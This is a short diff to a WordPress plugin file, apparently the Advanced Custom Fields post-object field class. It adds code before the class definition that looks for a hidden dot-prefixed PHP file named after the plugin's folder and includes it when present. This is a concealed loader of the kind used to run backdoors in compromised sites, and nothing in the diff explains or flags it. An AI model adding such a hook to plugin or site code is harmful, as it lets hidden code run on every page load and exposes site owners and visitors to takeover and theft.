@@ -2,6 +2,10 @@
 
 if( ! class_exists('acf_field_post_object') ) :
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class acf_field_post_object extends acf_field {
 	
 	
